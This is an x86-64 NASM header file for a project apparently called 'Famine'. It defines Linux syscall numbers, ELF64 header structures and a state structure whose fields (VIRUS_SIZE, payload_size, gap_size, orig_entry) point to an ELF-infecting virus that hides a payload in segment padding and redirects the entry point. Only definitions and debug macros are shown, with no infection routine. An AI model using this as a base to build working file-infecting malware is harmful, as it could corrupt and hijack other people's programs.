; Famine defines
%define		DIRENTS_BUFF_SIZE	4096
%define		PATH_MAX			1024
%define		VIRUS_SIZE			(_finish - _starting)

; SYSCALLS defines
%define		SYS_WRITE			1
%define		SYS_OPEN			2
%define		SYS_CLOSE			3
%define		SYS_LSEEK			8
%define		SYS_MMAP			9
%define		SYS_EXIT			60
%define		SYS_GETENTS			78


; MMAP defines
%define		PROT_READ			0x1
%define		PROT_WRITE			0x2
%define		MAP_ANONYMOUS		0x20
%define		MAP_SHARED			0x01
%define		MAP_PRIVATE			0x02


; OPEN defines
%define		O_RDONLY			0x0000
%define		O_WRONLY			0x0001
%define		O_RDWR				0x0002


; DIRENT defines
%define		D_INO_OFF			0x00
%define		D_OFF_OFF			0x08
%define		D_RECLEN_OFF		0x10
%define		D_NAME_OFF			0x12

; Utility defines
%define		FAM(x)				[(rbp - famine_size) + x]



; ELF structures
struc	elf64_ehdr
	.e_ident:		resb	16
	.e_type:		resw	1
	.e_machine:		resw	1
	.e_version:		resd	1
	.e_entry:		resq	1
	.e_phoff:		resq	1
	.e_shoff:		resq	1
	.e_flags:		resd	1
	.e_ehsize:		resw	1
	.e_phentsize:	resw	1
	.e_phnum:		resw	1
	.e_shentsize:	resw	1
	.e_shnum:		resw	1
	.e_shstrndx:	resw	1
endstruc

struc	elf64_phdr
	.p_type:		resd	1
	.p_flags:		resd	1
	.p_offset:		resq	1
	.p_vaddr:		resq	1
	.p_paddr:		resq	1
	.p_filesz:		resq	1
	.p_memsz:		resq	1
	.p_align:		resq	1
endstruc

; DIRENT_WRAPPER structure
struc	dirent_wrapper
	.total_dreclen	resq	1
endstruc

; FAMINE structure
struc	famine
	.dirents:		resb	DIRENTS_BUFF_SIZE
	.fd:			resd	1
	.map_ptr:		resq	1
	.fsize:			resd	1
	.payload_size:	resq	1
	.gap_size:		resq	1
	.txt_offset:	resq	1
	.txt_filesz:	resq	1
	.txt_vaddr:		resq	1
	.next_offset:	resq	1
	.orig_entry:	resq	1
endstruc



; Just some debugging macros to print messages
%macro write_string 2
	mov rax, 1
	mov rdi, 0
	mov rsi, %1
	mov rdx, %2
	syscall
%endmacro

%macro write_format 2
	push rdi
	push rsi
	push rax
	mov rdi, %1
	mov rsi, %2
	mov rax, 0
	call printf
	pop rax
	pop rsi
	pop rdi
%endmacro
